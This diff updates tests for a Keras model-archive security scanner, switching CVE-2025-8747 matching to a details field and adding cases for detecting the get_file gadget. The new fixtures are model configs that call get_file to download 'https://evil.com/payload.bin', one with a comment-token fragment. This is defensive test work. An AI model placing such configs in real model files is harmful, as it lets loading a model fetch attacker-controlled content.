@@ -896,9 +896,57 @@ class TestCVE20258747GetFileGadget:
         }
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
-        cve_issues = [i for i in result.issues if "CVE-2025-8747" in i.message]
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
         assert len(cve_issues) >= 1, "Should detect get_file + URL as CVE-2025-8747"
         assert cve_issues[0].severity == IssueSeverity.CRITICAL
+
+    def test_get_file_with_url_in_args_list_detected(self, tmp_path: Path) -> None:
+        """Config with URL inside args list should also be detected."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {
+                            "fn": "get_file",
+                            "args": ["https://evil.com/payload.bin"],
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert len(cve_issues) >= 1, "Should detect get_file + URL in args list as CVE-2025-8747"
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
+
+    def test_get_file_with_url_and_comment_token_detected(self, tmp_path: Path) -> None:
+        """Embedded comment tokens in URL strings should not suppress detection."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Dense",
+                        "name": "dense_1",
+                        "config": {
+                            "fn": "get_file",
+                            "url": "https://evil.com/payload.bin#comment-token",
+                        },
+                    }
+                ]
+            },
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
+        assert len(cve_issues) >= 1
+        assert cve_issues[0].severity == IssueSeverity.CRITICAL
+        assert cve_issues[0].details["cve_id"] == "CVE-2025-8747"
 
     def test_get_file_without_url_no_trigger(self, tmp_path: Path) -> None:
         """Config with get_file but no URL should NOT trigger."""
@@ -917,7 +965,7 @@ class TestCVE20258747GetFileGadget:
         }
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
-        cve_issues = [i for i in result.issues if "CVE-2025-8747" in i.message]
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
         assert len(cve_issues) == 0, "get_file without URL should not trigger"
 
     def test_no_false_positive_normal_config(self, tmp_path: Path) -> None:
@@ -929,7 +977,7 @@ class TestCVE20258747GetFileGadget:
         }
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
-        cve_issues = [i for i in result.issues if "CVE-2025-8747" in i.message]
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
         assert len(cve_issues) == 0
 
     def test_get_file_and_url_in_different_contexts_not_flagged(self, tmp_path: Path) -> None:
@@ -944,7 +992,7 @@ class TestCVE20258747GetFileGadget:
         }
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
-        cve_issues = [i for i in result.issues if "CVE-2025-8747" in i.message]
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
         assert len(cve_issues) == 0, "get_file and URL in unrelated contexts should not trigger CVE-2025-8747"
 
     def test_cve_attribution_details(self, tmp_path: Path) -> None:
@@ -969,11 +1017,12 @@ class TestCVE20258747GetFileGadget:
         )
         result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
 
-        cve_issues = [i for i in result.issues if "CVE-2025-8747" in i.message]
+        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
         assert len(cve_issues) >= 1
         details = cve_issues[0].details
         assert details["cve_id"] == "CVE-2025-8747"
         assert details["cwe"] == "CWE-502"
+        assert details["description"]
 
 
 class TestKerasZipScannerSubclassed:
